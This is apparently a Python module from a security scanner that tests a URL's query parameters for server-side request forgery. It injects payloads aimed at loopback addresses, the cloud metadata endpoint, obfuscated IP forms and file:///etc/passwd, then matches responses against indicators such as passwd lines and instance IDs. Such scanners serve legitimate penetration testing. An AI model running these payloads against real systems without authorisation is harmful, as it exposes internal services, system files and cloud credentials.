import requests
from urllib.parse import urlparse, parse_qs, urlencode
from config import DEFAULT_TIMEOUT

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://2130706433/",
    "http://017700000001/",
    "dict://127.0.0.1:11211/",
    "file:///etc/passwd",
    "http://internal.service/",
]

SSRF_INDICATORS = [
    "root:x:", "daemon:", "/bin/bash",
    "ami-id", "instance-id", "instance-type",
    "Connection refused", "Connection timed out",
    "Name or service not known",
]


def scan_ssrf(url: str) -> list:
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    url_params = [k for k in params if any(kw in k.lower() for kw in
                  ["url", "uri", "link", "src", "source", "dest", "redirect", "path", "file", "load"])]
    if not url_params:
        url_params = list(params.keys())[:3]

    session = requests.Session()
    session.headers["User-Agent"] = "OPTISEC-ReconPro/1.0 (Security Testing)"

    for param in url_params:
        for payload in SSRF_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                r = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                body = r.text
                for indicator in SSRF_INDICATORS:
                    if indicator.lower() in body.lower():
                        findings.append({
                            "type": "SSRF",
                            "severity": "Critical",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": f"SSRF indicator found: '{indicator}'",
                        })
                        break
            except Exception:
                continue

    return findings
